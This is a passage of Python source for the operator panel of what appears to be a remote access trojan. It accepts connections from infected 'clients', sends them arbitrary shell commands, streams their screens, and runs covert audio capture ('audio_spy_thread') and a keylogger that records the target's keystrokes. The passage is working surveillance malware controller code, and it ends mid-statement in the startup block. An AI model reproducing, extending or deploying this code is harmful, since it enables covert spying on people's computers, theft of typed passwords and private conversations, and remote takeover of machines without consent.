                self.connected_client_label.configure(text=f"{addr[0]}:{addr[1]}")
                self.log(f"Auto-selected client {client_id} at {addr[0]}:{addr[1]}", log_type="info")
            else:
                messagebox.showinfo("No Clients", "No clients are connected. Please connect to a client first.")
                self.notebook.select(1)  # Switch to Clients tab
                return
        
        # Switch to Command Shell tab
        self.notebook.select(3)  # Command Shell tab index
        
        # Focus the command input
        if hasattr(self, 'command_input'):
            self.root.after(100, lambda: self.command_input.focus_set())
        
        # Update connection status
        self.update_connection_status(True)
        
        # Add welcome message to terminal if it exists
        if hasattr(self, 'terminal_output'):
            try:
                hostname = self.getHostName(self.current_client_socket)
                
                self.terminal_output.configure(state="normal")
                self.terminal_output.insert(tk.END, f"\nConnected to {hostname}\n", "system")
                self.terminal_output.insert(tk.END, "Ready for commands. Type 'help' for a list of common commands.\n\n", "system")
                self.terminal_output.see(tk.END)
                self.terminal_output.configure(state="disabled")
            except:
                pass

                
    def quick_screen_capture(self):
        """Quick access to screen capture for selected client"""
        # Check if a client is selected
        if not self.current_client_socket:
            # Try to select the first available client
            if len(self.clients) > 0:
                first_client = list(self.clients.items())[0]
                addr, (client_id, conn) = first_client
                self.current_client_socket = conn
                self.connected_client_label.configure(text=f"{addr[0]}:{addr[1]}")
                self.log(f"Auto-selected client {client_id} at {addr[0]}:{addr[1]}", log_type="info")
            else:
                messagebox.showinfo("No Clients", "No clients are connected. Please connect to a client first.")
                self.notebook.select(1)  # Switch to Clients tab
                return
        
        # Switch to Monitoring tab
        self.notebook.select(4)  # Monitoring tab index
        
        # Start screen capture if not already active
        if not self.receive_screenshot_trigger:
            # Delay slightly to allow tab switch to complete
            self.root.after(100, self.start_screen_capture)
        else:
            # If already running, just show a message
            self.log("Screen capture is already active", log_type="info")
            
    
    def accept_clients(self):
        """Enhanced client acceptance with better logging and alerts"""
        while self.is_server_running:
            try:
                conn, addr = self.server_socket.accept()
                self.log(f"Client connected: {addr[0]}:{addr[1]}", log_type="client")
                
                self.clients[(addr[0], addr[1])] = (self.client_counter, conn)
                self.client_counter += 1
                
                # self.clients_value.configure(text=str(len(self.clients)))
                
                try:
                    hostname = self.getHostName(conn)
                    self.add_alert(f"New client: {hostname} ({addr[0]})")
                except:
                    hostname = "Unknown"
                    self.add_alert(f"New client from {addr[0]}")
                    
                self.clients_tree.insert("", "end", values=(self.client_counter - 1, addr[0], addr[1], hostname, "Connected"))
                
            except OSError:
                break
            except Exception as e:
                self.log(f"Error accepting client: {e}", log_type="error")
    

    # Client operations
    def refresh_clients(self):
        # Clear treeview
        for item in self.clients_tree.get_children():
            self.clients_tree.delete(item)
        
        # Re-add clients
        for addr, (client_id, conn) in self.clients.items():
            try:
                hostname = self.getHostName(conn)
            except:
                hostname = "Unknown"
                
            self.clients_tree.insert("", "end", values=(client_id, addr[0], addr[1], hostname, "Connected"))
        
        # self.clients_value.configure(text=str(len(self.clients)))
        self.log("Clients list refreshed")
    
    def connect_to_client(self):
        """Enhanced version to connect to a client with additional info"""
        # Get selected client
        selection = self.clients_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a client to connect")
            return
        
        selected_id = self.clients_tree.item(selection[0])["values"][0]
        
        # Find the client socket
        for addr, (client_id, conn) in self.clients.items():
            if client_id == selected_id:
                self.current_client_socket = conn
                self.connected_client_label.configure(text=f"{addr[0]}:{addr[1]}")
                
                # Update file transfer client info
                if hasattr(self, 'file_transfer'):
                    self.file_transfer.update_client_info()
                
                # Update process manager client info
                if hasattr(self, 'process_manager'):
                    self.process_manager.update_client_info()
                
                # Update advanced monitoring client info
                if hasattr(self, 'advanced_monitoring'):
                    self.advanced_monitoring.update_client_info()
                    
                if hasattr(self, 'remote_desktop'):
                    self.remote_desktop.update_client_info()
                    
                # Switch to command tab
                self.notebook.select(2)  # Command Shell tab
                
                try:
                    # Update connection status
                    self.update_connection_status(True)
                    
                    # Get hostname and OS info
                    hostname = self.getHostName(conn)
                    
                    # Get OS information
                    try:
                        if self.terminal_mode.get() == "bash":
                            os_info_cmd = "uname -s -r"
                        else:
                            os_info_cmd = "wmic os get Caption,Version /value"
                            
                        os_result, _ = self.send_cmd(conn, os_info_cmd)
                        os_info = os_result.decode().strip()
                        
                        # Parse OS info for display
                        if "Windows" in os_info:
                            # Extract from Windows format
                            caption_match = re.search(r'Caption=([^\r\n]+)', os_info)
                            version_match = re.search(r'Version=([^\r\n]+)', os_info)
                            
                            os_name = caption_match.group(1) if caption_match else "Windows"
                            os_version = version_match.group(1) if version_match else ""
                            
                            self.client_os_label.configure(text=f"OS: {os_name} {os_version}")
                        else:
                            # Unix/Linux format
                            self.client_os_label.configure(text=f"OS: {os_info}")
                    except:
                        self.client_os_label.configure(text="")
                    
                    self.log(f"Connected to client: {hostname} ({addr[0]}:{addr[1]})")
                    
                    # Clear terminal and show welcome message
                    self.terminal_output.configure(state="normal")
                    self.terminal_output.delete(1.0, tk.END)
                    self.terminal_output.insert(tk.END, f"Connected to {hostname} ({addr[0]}:{addr[1]})\n", "system")
                    
                    # Add OS info if available
                    if self.client_os_label.cget("text"):
                        self.terminal_output.insert(tk.END, f"{self.client_os_label.cget('text')}\n", "system")
                    
                    # Add instructions and set the appropriate prompt
                    self.terminal_output.insert(tk.END, 
                        "Type commands and press Enter to execute. Use Up/Down arrows for history.\n", "system")
                    self.terminal_output.insert(tk.END, 
                        "Common commands: systeminfo, ipconfig, tasklist, dir, net user\n\n", "system")
                    
                    # Set the appropriate mode based on OS detection
                    if "Windows" in os_info:
                        self.terminal_mode.set("cmd")
                        self.prompt_label.configure(text="cmd>")
                    elif "Linux" in os_info or "Unix" in os_info:
                        self.terminal_mode.set("bash")
                        self.prompt_label.configure(text="bash$")
                    
                    self.terminal_output.configure(state="disabled")
                    
                    # Update cmd_status_bar
                    self.cmd_status_bar.configure(text=f"Connected to {hostname}")
                    
                except Exception as e:
                    self.log(f"Error connecting to client: {e}")
                    self.terminal_output.configure(state="normal")
                    self.terminal_output.insert(tk.END, f"Error connecting: {e}\n", "error")
                    self.terminal_output.configure(state="disabled")
                    self.update_connection_status(False)
                
                # Focus the command input
                self.command_input.focus_set()
                return
        
        messagebox.showerror("Error", "Could not find selected client")
    
    def disconnect_client(self):
        # Get selected client
        selection = self.clients_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a client to disconnect")
            return
        
        selected_id = self.clients_tree.item(selection[0])["values"][0]
        
        # Find and remove the client
        client_addr = None
        for addr, (client_id, conn) in list(self.clients.items()):
            if client_id == selected_id:
                client_addr = addr
                try:
                    conn.close()
                except:
                    pass
                
                del self.clients[addr]
                
                # Update UI
                self.clients_tree.delete(selection[0])
                self.clients_value.configure(text=str(len(self.clients)))
                
                # Reset current client if it was the one disconnected
                if self.current_client_socket == conn:
                    self.current_client_socket = None
                    self.connected_client_label.configure(text="None")
                    
                    # Update file transfer UI
                    if hasattr(self, 'file_transfer'):
                        self.file_transfer.update_client_info()
                    
                    # Update process manager UI
                    if hasattr(self, 'process_manager'):
                        self.process_manager.update_client_info()
                    
                    # Update advanced monitoring UI
                    if hasattr(self, 'advanced_monitoring'):
                        self.advanced_monitoring.update_client_info()
                
                    if hasattr(self, 'remote_desktop') and self.remote_desktop.is_controlling:
                        self.remote_desktop.stop_remote_control()
                self.log(f"Client disconnected: {addr[0]}:{addr[1]}")
                break
        
        if not client_addr:
            messagebox.showerror("Error", "Could not find selected client")
            
    # Update the disconnect_all method to include the process manager:
    def disconnect_all(self):
    # Close all client connections
        for addr, (_, conn) in list(self.clients.items()):
            try:
                conn.close()
            except:
                pass
        
        # Clear clients dictionary and update UI
        self.clients.clear()
        self.current_client_socket = None
        self.connected_client_label.configure(text="None")
        
        # Update file transfer UI
        if hasattr(self, 'file_transfer'):
            self.file_transfer.update_client_info()
        
        # Update process manager UI
        if hasattr(self, 'process_manager'):
            self.process_manager.update_client_info()
        
        # Update advanced monitoring UI
        if hasattr(self, 'advanced_monitoring'):
            self.advanced_monitoring.update_client_info()
        if hasattr(self, 'remote_desktop') and self.remote_desktop.is_controlling:
            self.remote_desktop.stop_remote_control()
        # Clear treeview
        for item in self.clients_tree.get_children():
            self.clients_tree.delete(item)
        
        # self.clients_value.configure(text="0")
        self.log("All clients disconnected")

    
    def show_client_menu(self, event):
        # Show context menu on right-click
        if self.clients_tree.selection():
            self.client_menu.post(event.x_root, event.y_root)
    
    def view_client_details(self):
        # Get selected client
        selection = self.clients_tree.selection()
        if not selection:
            return
        
        selected_values = self.clients_tree.item(selection[0])["values"]
        
        # Create details dialog
        details_window = ctk.CTkToplevel(self.root)
        details_window.title("Client Details")
        details_window.geometry("400x300")
        details_window.resizable(False, False)
        
        # Add client details
        frame = ctk.CTkFrame(details_window)
        frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        title = ctk.CTkLabel(frame, text="Client Information", font=ctk.CTkFont(size=16, weight="bold"))
        title.pack(pady=10)
        
        # Client ID
        id_frame = ctk.CTkFrame(frame)
        id_frame.pack(fill=tk.X, pady=5)
        
        id_label = ctk.CTkLabel(id_frame, text="Client ID:", width=100)
        id_label.pack(side=tk.LEFT, padx=5)
        
        id_value = ctk.CTkLabel(id_frame, text=str(selected_values[0]))
        id_value.pack(side=tk.LEFT, padx=5)
        
        # IP Address
        ip_frame = ctk.CTkFrame(frame)
        ip_frame.pack(fill=tk.X, pady=5)
        
        ip_label = ctk.CTkLabel(ip_frame, text="IP Address:", width=100)
        ip_label.pack(side=tk.LEFT, padx=5)
        
        ip_value = ctk.CTkLabel(ip_frame, text=selected_values[1])
        ip_value.pack(side=tk.LEFT, padx=5)
        
        # Port
        port_frame = ctk.CTkFrame(frame)
        port_frame.pack(fill=tk.X, pady=5)
        
        port_label = ctk.CTkLabel(port_frame, text="Port:", width=100)
        port_label.pack(side=tk.LEFT, padx=5)
        
        port_value = ctk.CTkLabel(port_frame, text=str(selected_values[2]))
        port_value.pack(side=tk.LEFT, padx=5)
        
        # Hostname
        hostname_frame = ctk.CTkFrame(frame)
        hostname_frame.pack(fill=tk.X, pady=5)
        
        hostname_label = ctk.CTkLabel(hostname_frame, text="Hostname:", width=100)
        hostname_label.pack(side=tk.LEFT, padx=5)
        
        hostname_value = ctk.CTkLabel(hostname_frame, text=selected_values[3])
        hostname_value.pack(side=tk.LEFT, padx=5)
        
        # Actions
        actions_frame = ctk.CTkFrame(frame)
        actions_frame.pack(fill=tk.X, pady=10)
        
        connect_btn = ctk.CTkButton(actions_frame, text="Connect", 
                                   command=lambda: [details_window.destroy(), self.connect_to_client()])
        connect_btn.pack(side=tk.LEFT, padx=5)
        
        disconnect_btn = ctk.CTkButton(actions_frame, text="Disconnect", 
                                      command=lambda: [details_window.destroy(), self.disconnect_client()])
        disconnect_btn.pack(side=tk.LEFT, padx=5)
        
        close_btn = ctk.CTkButton(actions_frame, text="Close", command=details_window.destroy)
        close_btn.pack(side=tk.RIGHT, padx=5)
    
    # Command functions
    def send_command(self, event):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        command = self.command_input.get()
        if not command:
            return
        
        try:
            # Display command in terminal
            self.terminal_output.configure(state="normal")
            self.terminal_output.insert(tk.END, f"> {command}\n")
            
            # Send command to client
            result, size = self.send_cmd(self.current_client_socket, command)
            
            # Display result
            self.terminal_output.insert(tk.END, f"{result.decode()}\n\n")
            self.terminal_output.see(tk.END)
            self.terminal_output.configure(state="disabled")
            
            # Clear command input
            self.command_input.delete(0, tk.END)
            
        except Exception as e:
            self.log(f"Error sending command: {e}")
            
            self.terminal_output.configure(state="normal")
            self.terminal_output.insert(tk.END, f"Error: {e}\n\n")
            self.terminal_output.see(tk.END)
            self.terminal_output.configure(state="disabled")
    
    # Monitoring functions
    def start_screen_capture(self):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        self.receive_screenshot_trigger = True
        threading.Thread(target=self.receive_screenshot_thread, daemon=True).start()
        
        # Update UI
        self.start_screen_btn.configure(state="disabled")
        self.stop_screen_btn.configure(state="normal")
        self.log("Started screen capture")
    
    def receive_screenshot_thread(self):
        """Receive and display screenshots from client with improved performance"""
        try:
            # Create and configure UDP socket with improved buffer management
            udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Use a more moderate initial buffer size - we'll adjust dynamically
            initial_buffer_size = 4194304  # 4MB buffer
            udps.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, initial_buffer_size)
            
            # Set non-blocking mode instead of timeout for better performance
            udps.setblocking(False)
            
            # Bind to the listening address
            udps.bind(self.address)
            
            # Signal the client to start sending screenshots
            self.current_client_socket.send(b'SCRSHOOT')
            
            # Initialize frame processing variables with more efficient data structures
            current_frame = {}  # Dictionary to hold chunks for current frame
            expected_frames = {}  # Track metadata for expected frames
            last_frame_number = 0  # Track frame sequence
            
            # Use a LRU cache for frame data to limit memory usage
            frame_cache = collections.OrderedDict()
            
            # Pre-allocate memory for frequently used objects
            decoder_params = [cv2.IMWRITE_JPEG_QUALITY, 95]
            
            # Buffer pool for image processing to reduce memory allocations
            buffer_pool = []
            
            # Frame statistics for adaptive performance
            frame_stats = {
                'total_frames': 0,
                'complete_frames': 0,
                'dropped_frames': 0,
                'avg_process_time': 0,
                'network_stats': collections.deque(maxlen=30)  # Rolling window of 30 frames
            }
            
            # Performance monitoring
            last_stats_time = time.time()
            stats_interval = 5.0  # Log stats every 5 seconds
            
            # self.log("Screenshot receiver started")

            while self.receive_screenshot_trigger:
                try:
                    # Use select for non-blocking I/O with timeout
                    readable, _, _ = select.select([udps], [], [], 0.01)
                    
                    if not readable:
                        # No data available, perform housekeeping
                        self._check_frame_timeouts(current_frame, expected_frames, frame_stats)
                        
                        # Print periodic statistics
                        current_time = time.time()
                        if current_time - last_stats_time > stats_interval:
                            self._log_performance_stats(frame_stats)
                            last_stats_time = current_time
                            
                        continue
                    
                    # Receive packet efficiently
                    packet, _ = udps.recvfrom(65536)
                    
                    # Process packet with optimized handling
                    if self._process_packet(
                        packet, 
                        current_frame, 
                        expected_frames, 
                        frame_stats, 
                        frame_cache, 
                        buffer_pool,
                        decoder_params
                    ):
                        # If a new frame was processed, update the UI
                        if frame_cache and max(frame_cache.keys()) > last_frame_number:
                            last_frame_number = max(frame_cache.keys())
                    
                except BlockingIOError:
                    # Expected with non-blocking socket
                    continue
                    
                except Exception as e:
                    if not self.receive_screenshot_trigger:
                        break
                    
                    self.log(f"Screenshot Receive Error: {e}")
                    
                    # Implement exponential backoff for error recovery
                    time.sleep(0.1)
                    continue
            
            # Cleanup
            udps.close()
            if self.current_client_socket:
                self.current_client_socket.send(b'STOP_SCRSHOOT')
            
            self.log(f"Screenshot receiver stopped. Stats: {frame_stats['complete_frames']} complete frames, "
                    f"{frame_stats['dropped_frames']} dropped frames")
            
        except Exception as e:
            self.log(f"Screenshot receiver thread error: {e}")
        
        # Reset UI elements
        self._reset_ui_elements()

    def _process_packet(self, packet, current_frame, expected_frames, frame_stats, frame_cache, buffer_pool, decoder_params):
        """Process a packet with improved performance"""
        try:
            # Quick check for termination signal
            if len(packet) == 16:
                data_len, num_chunks, frame_number = struct.unpack('!QII', packet[:16])
                if data_len == 0 and num_chunks == 0 and frame_number == 0:
                    self.log("Received termination signal from client")
                    return False
            
            # Efficient header processing using slice operations instead of struct unpacking where possible
            if len(packet) >= 16 and len(packet) == 16:  # Metadata packet
                data_len, num_chunks, frame_number = struct.unpack('!QII', packet[:16])
                
                # Store expected frame information
                expected_frames[frame_number] = {
                    'total_size': data_len,
                    'total_chunks': num_chunks,
                    'received_chunks': 0,
                    'start_time': time.time(),
                    'chunks': {}
                }
                
                # Initialize storage for this frame
                current_frame[frame_number] = {}
                
                # Intelligent cleanup - only keep recent frames based on memory pressure
                current_frames = sorted(current_frame.keys())
                if len(current_frames) > 5:  # Keep only 5 most recent frames
                    for old_frame in current_frames[:-5]:
                        del current_frame[old_frame]
                        if old_frame in expected_frames:
                            del expected_frames[old_frame]
                
                return True
                
            elif len(packet) > 12:  # Chunk packet
                # Use memoryview for zero-copy slicing of packet data
                mv_packet = memoryview(packet)
                
                # Extract header
                frame_number = struct.unpack('!I', mv_packet[0:4])[0]
                chunk_index = struct.unpack('!I', mv_packet[4:8])[0]
                total_chunks = struct.unpack('!I', mv_packet[8:12])[0]
                
                # Extract chunk data without copying
                chunk_data = mv_packet[12:]
                
                # Store chunk in frame dictionary
                if frame_number in current_frame:
                    current_frame[frame_number][chunk_index] = bytes(chunk_data)  # Convert memoryview to bytes
                    
                    # Update received chunks count
                    if frame_number in expected_frames:
                        expected_frames[frame_number]['received_chunks'] += 1
                
                # Check if we have all chunks for this frame
                if (frame_number in current_frame and 
                    frame_number in expected_frames and
                    len(current_frame[frame_number]) == expected_frames[frame_number]['total_chunks']):
                    
                    # Process frame asynchronously to avoid blocking the receiver
                    threading.Thread(
                        target=self._process_complete_frame,
                        args=(
                            frame_number, 
                            current_frame, 
                            expected_frames, 
                            frame_stats, 
                            frame_cache, 
                            buffer_pool,
                            decoder_params
                        )
                    ).start()
                    
                    return True
        
        except Exception as e:
            self.log(f"Error processing packet: {e}")
        
        return False

    def _process_complete_frame(self, frame_number, current_frame, expected_frames, 
                            frame_stats, frame_cache, buffer_pool, decoder_params):
        """Process a complete frame with performance optimizations"""
        start_time = time.time()
        
        try:
            # All chunks received, reassemble frame efficiently
            chunks = sorted(current_frame[frame_number].items())
            
            # Preallocate the exact byte array size
            frame_size = expected_frames[frame_number]['total_size']
            frame_data = bytearray(frame_size)
            
            # Fill the buffer with chunks
            offset = 0
            for _, chunk in chunks:
                chunk_len = len(chunk)
                frame_data[offset:offset+chunk_len] = chunk
                offset += chunk_len
            
            # Early validation of frame size
            if len(frame_data) != frame_size:
                self.log(f"Frame size mismatch: expected {frame_size}, got {len(frame_data)}")
                frame_stats['dropped_frames'] += 1
                return False
            
            # Process the complete frame
            img = self._decode_frame_data(bytes(frame_data), frame_number, buffer_pool, decoder_params)
            if img:
                # Store in LRU cache
                frame_cache[frame_number] = img
                if len(frame_cache) > self.MAX_CACHE_SIZE:
                    # Remove oldest frame
                    frame_cache.popitem(last=False)
                
                # Update displays
                self._update_monitor_display(img)
                self._update_remote_desktop_display(img.copy())
                
                # Update statistics
                frame_stats['complete_frames'] += 1
                process_time = time.time() - start_time
                
                # Update rolling average
                if frame_stats['avg_process_time'] == 0:
                    frame_stats['avg_process_time'] = process_time
                else:
                    frame_stats['avg_process_time'] = 0.9 * frame_stats['avg_process_time'] + 0.1 * process_time
                
                # Add network statistics
                frame_stats['network_stats'].append({
                    'frame_size': frame_size,
                    'process_time': process_time,
                    'timestamp': time.time()
                })
                
                # Clean up this frame data
                del current_frame[frame_number]
                del expected_frames[frame_number]
                
                return True
            else:
                frame_stats['dropped_frames'] += 1
                return False
                
        except Exception as e:
            self.log(f"Error Processing Complete Frame {frame_number}: {e}")
            frame_stats['dropped_frames'] += 1
            return False

    def _decode_frame_data(self, frame_data, frame_number, buffer_pool, decoder_params):
        """Decode frame data with optimized pipeline"""
        try:
            # Use thread-local zlib decompressor for better performance
            if not hasattr(self, '_zlib_decomp'):
                self._zlib_decomp = zlib.decompressobj()
            
            try:
                # Reuse buffer from pool if available
                if buffer_pool:
                    buffer = buffer_pool.pop()
                    buffer.clear()
                    buffer.extend(zlib.decompress(frame_data))
                    decompress_imdata = buffer
                else:
                    # Create new buffer
                    decompress_imdata = bytearray(zlib.decompress(frame_data))
            except zlib.error as ze:
                self.log(f"Decompression Error On Frame {frame_number}: {ze}")
                return None
            
            # Convert to numpy array with zero-copy
            npimg = np.frombuffer(decompress_imdata, dtype=np.uint8)
            
            # Use imdecode with optimized flags
            decode_img = cv2.imdecode(npimg, cv2.IMREAD_UNCHANGED)
            
            # Check if decoding was successful
            if decode_img is None:
                self.log(f"Failed To Decode Image From Frame {frame_number}")
                return None
            
            # Convert color space efficiently using optimized OpenCV flags
            if decode_img.shape[2] == 3:  # Only convert if needed
                colored_image = cv2.cvtColor(decode_img, cv2.COLOR_BGR2RGB)
            else:
                colored_image = decode_img
            
            # Convert directly to PIL Image with optimized path
            img = Image.fromarray(colored_image)
            
            # Return buffer to pool if pool isn't too large
            if len(buffer_pool) < self.MAX_BUFFER_POOL_SIZE:
                buffer_pool.append(decompress_imdata)
            
            return img
            
        except Exception as e:
            self.log(f"Error Decoding Frame {frame_number}: {e}")
            return None

    def _check_frame_timeouts(self, current_frame, expected_frames, frame_stats):
        """Check for timeouts on frames with adaptive timing"""
        current_time = time.time()
        
        # Dynamic timeout based on network conditions
        if frame_stats['network_stats']:
            # Calculate average recent frame time
            recent_times = [stats['process_time'] for stats in list(frame_stats['network_stats'])[-5:]]
            if recent_times:
                avg_recent_time = sum(recent_times) / len(recent_times)
                # Dynamic timeout - longer of 3x average frame time or 1 second
                timeout = max(avg_recent_time * 3, 1.0)
            else:
                timeout = 1.0
        else:
            timeout = 1.0
        
        # Check for timeouts
        for frame_num in list(expected_frames.keys()):
            frame_age = current_time - expected_frames[frame_num]['start_time']
            if frame_age > timeout:
                # Log incomplete frame stats
                received = expected_frames[frame_num]['received_chunks']
                total = expected_frames[frame_num]['total_chunks']
                
                # Only log significant drops
                if received > 0:
                    self.log(f"Abandoning incomplete frame {frame_num}: {received}/{total} chunks after {frame_age:.1f}s")
                
                # Update statistics
                frame_stats['dropped_frames'] += 1
                
                # Clean up
                if frame_num in current_frame:
                    del current_frame[frame_num]
                del expected_frames[frame_num]

    def _log_performance_stats(self, frame_stats):
        """Log periodic performance statistics"""
        # Calculate recent FPS
        if len(frame_stats['network_stats']) >= 2:
            first_ts = frame_stats['network_stats'][0]['timestamp']
            last_ts = frame_stats['network_stats'][-1]['timestamp']
            if last_ts > first_ts:
                time_span = last_ts - first_ts
                fps = len(frame_stats['network_stats']) / time_span
                
                # Calculate average bitrate
                total_bytes = sum(stats['frame_size'] for stats in frame_stats['network_stats'])
                bitrate = (total_bytes * 8) / time_span
                
                self.log(f"Performance: {fps:.1f} FPS, {bitrate/1000000:.2f} Mbps, "
                        f"Avg Process: {frame_stats['avg_process_time']*1000:.1f}ms, "
                        f"Complete: {frame_stats['complete_frames']}, "
                        f"Dropped: {frame_stats['dropped_frames']}")

    def _update_monitor_display(self, img):
        """Update the main monitoring display with the screenshot"""
        try:
            # Get image dimensions
            img_width, img_height = img.size
            
            # Get display dimensions
            screen_width = self.screen_display.winfo_width()
            screen_height = self.screen_display.winfo_height()
            
            # Only proceed if display has been rendered
            if screen_width > 10 and screen_height > 10:
                # Create a blank canvas
                monitor_canvas = Image.new('RGB', (screen_width, screen_height), color='black')
                
                # Calculate scaled dimensions
                scale = min(screen_width / img_width, screen_height / img_height)
                new_width = int(img_width * scale)
                new_height = int(img_height * scale)
                
                # Resize the image
                monitor_img = img.resize((new_width, new_height), Image.LANCZOS)
                
                # Calculate position to center the image
                x_offset = (screen_width - new_width) // 2
                y_offset = (screen_height - new_height) // 2
                
                # Paste the resized image onto the canvas
                monitor_canvas.paste(monitor_img, (x_offset, y_offset))
                
                # Convert to PhotoImage and display
                monitor_img_tk = ImageTk.PhotoImage(image=monitor_canvas)
                self.screen_display.configure(image=monitor_img_tk)
                self.screen_display.image = monitor_img_tk  # Keep a reference
        except Exception as e:
            self.log(f"Error Updating Monitor Display: {e}")

    def _update_remote_desktop_display(self, img):
        """Update the remote desktop display if available"""
        try:
            if hasattr(self, 'remote_desktop') and hasattr(self.remote_desktop, 'screen_label'):
                # Get image dimensions
                img_width, img_height = img.size
                
                # Get remote desktop dimensions
                remote_width = self.remote_desktop.screen_label.winfo_width()
                remote_height = self.remote_desktop.screen_label.winfo_height()
                
                if remote_width > 10 and remote_height > 10:
                    # Create a blank canvas
                    remote_canvas = Image.new('RGB', (remote_width, remote_height), color='black')
                    
                    # Calculate scaled dimensions
                    scale = min(remote_width / img_width, remote_height / img_height)
                    new_width = int(img_width * scale)
                    new_height = int(img_height * scale)
                    
                    # Resize the image
                    remote_img = img.resize((new_width, new_height), Image.LANCZOS)
                    
                    # Calculate position to center the image
                    x_offset = (remote_width - new_width) // 2
                    y_offset = (remote_height - new_height) // 2
                    
                    # Paste the resized image onto the canvas
                    remote_canvas.paste(remote_img, (x_offset, y_offset))
                    
                    # Convert to PhotoImage and display
                    remote_img_tk = ImageTk.PhotoImage(image=remote_canvas)
                    self.remote_desktop.screen_label.configure(image=remote_img_tk)
                    self.remote_desktop.screen_label.image = remote_img_tk  # Keep a reference
                    
                    # Update client dimensions for mouse movement scaling
                    if hasattr(self.remote_desktop, 'client_width'):
                        self.remote_desktop.client_width = img_width
                        self.remote_desktop.client_height = img_height
                    
                    # Notify the remote desktop controller about the received frame
                    if hasattr(self.remote_desktop, 'on_frame_received') and self.remote_desktop.is_controlling:
                        # Use img size for bandwidth calculation
                        img_buffer = io.BytesIO()
                        img.save(img_buffer, format='JPEG')
                        self.remote_desktop.on_frame_received(len(img_buffer.getvalue()))
        except Exception as e:
            self.log(f"Error Updating Remote Desktop Display: {e}")

    def _reset_ui_elements(self):
        """Reset UI elements after screenshot thread stops"""
        try:
            # Reset main display UI
            self.start_screen_btn.configure(state="normal")
            self.stop_screen_btn.configure(state="disabled")
            self.screen_display.configure(image="")
            self.screen_display.configure(text="No screen capture active")
            
            # Reset remote desktop display if it exists
            if hasattr(self, 'remote_desktop') and hasattr(self.remote_desktop, 'screen_label'):
                self.remote_desktop.screen_label.configure(image="")
                self.remote_desktop.screen_label.configure(text="Remote desktop view will appear here")
        except Exception as e:
            self.log(f"Error resetting UI elements: {e}")
    
    def stop_screen_capture(self):
        self.receive_screenshot_trigger = False
        self.log("Stopped Screen Capture")
    
    def start_audio_monitoring(self):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        self.audiospy_trigger = True
        threading.Thread(target=self.audio_spy_thread, daemon=True).start()
        
        # Update UI
        self.start_audio_btn.configure(state="disabled")
        self.stop_audio_btn.configure(state="normal")
        self.audio_display.configure(text="Audio monitoring active")
        self.log("Started audio monitoring")
    
    def audio_spy_thread(self):
        try:
            udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udps.bind(self.address)
            self.current_client_socket.send(b'AUDIO_SPY')
            
            paudio = pyaudio.PyAudio()
            audio_stream = paudio.open(channels=2, rate=44100, format=pyaudio.paInt16, output=True)
            
            while self.audiospy_trigger:
                try:
                    size_ = struct.unpack('Q', udps.recvfrom(8)[0])[0]
                    audio_data = udps.recvfrom(size_)[0]
                    audio_stream.write(audio_data, exception_on_underflow=False)
                except Exception as e:
                    if not self.audiospy_trigger:
                        break
                    self.log(f"Audio monitoring error: {e}")
                    continue
            
            # Cleanup
            audio_stream.stop_stream()
            audio_stream.close()
            paudio.terminate()
            udps.close()
            
            if self.current_client_socket:
                self.current_client_socket.send(b'CLOSE_AUDIO_SPY')
            
        except Exception as e:
            self.log(f"Audio monitoring thread error: {e}")
        
        # Reset UI
        self.start_audio_btn.configure(state="normal")
        self.stop_audio_btn.configure(state="disabled")
        self.audio_display.configure(text="No audio monitoring active")
    
    def stop_audio_monitoring(self):
        self.audiospy_trigger = False
        self.log("Stopped audio monitoring")
    
    def start_keylogger(self):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        self.keyboard_recording_trigger = True
        threading.Thread(target=self.keyboard_record_thread, daemon=True).start()
        
        # Update UI
        self.start_keyboard_btn.configure(state="disabled")
        self.stop_keyboard_btn.configure(state="normal")
        self.keyboard_log.delete(1.0, tk.END)
        self.log("Started keylogger")
    
    def keyboard_record_thread(self):
        try:
            self.current_client_socket.send(b'KEY_REC')
            full_word = ''
            
            while self.keyboard_recording_trigger:
                try:
                    data = self.current_client_socket.recv(self.BUFFER).decode().strip("'")
                    if not data:
                        continue
                    
                    if '⌫' in data:
                        # Backspace
                        full_word = full_word[:-1]
                    elif '\n' in data:
                        full_word += '\n'
                    else:
                        full_word += data
                    
                    # Update keyboard log
                    self.keyboard_log.delete(1.0, tk.END)
                    self.keyboard_log.insert(tk.END, full_word)
                    self.keyboard_log.see(tk.END)
                
                except Exception as e:
                    if not self.keyboard_recording_trigger:
                        break
                    self.log(f"Keylogger error: {e}")
                    continue
            
            # Stop keylogger on client
            if self.current_client_socket:
                self.current_client_socket.send(b'STOP_KEY_REC')
            
        except Exception as e:
            self.log(f"Keylogger thread error: {e}")
        
        # Reset UI
        self.start_keyboard_btn.configure(state="normal")
        self.stop_keyboard_btn.configure(state="disabled")
    
    def stop_keylogger(self):
        self.keyboard_recording_trigger = False
        self.log("Stopped keylogger")
    
    # Helper functions from original code
    def data_unpacker(self, data) -> int:
        return struct.unpack('Q', data)[0]
    
    def getHostName(self, client_socket) -> str:
        client_socket.send('GETHOSTNAME'.encode())
        hostname = client_socket.recv(self.BUFFER)
        return hostname.decode()
    
    def send_cmd(self, client_socket, command) -> tuple:
        xcommand = 'CMD_COMMAND_' + command
        client_socket.send(xcommand.encode('utf-8'))
        size_ = self.data_unpacker(client_socket.recv(8))
        data = client_socket.recv(size_)
        return (data, size_)
    
    def validate_string(self, text):
        if len(text) == 0:
            return False
        elif text == '':
            return False
        elif text == ' ':
            return False
        elif text.isspace():
            return False
        return True
    
    def run(self):
        # Run the main application loop
        self.root.mainloop()


if __name__ == "__main__":
    # Handle import errors gracefully
    missing_modules = []
    try:
        import customtkinter as ctk
    except ImportError:
        missing_modules.append("customtkinter")
    
    try:
        from PIL import ImageTk
    except ImportError:
        missing_modules.append("pillow")
    
    if missing_modules:
        try:
            import tkinter as tk
            from tkinter import messagebox
            
            root = tk.Tk()
            root.withdraw()
            
            messagebox.showerror(
                "Missing Dependencies",
                f"Please install the following Python modules:\n\n" +
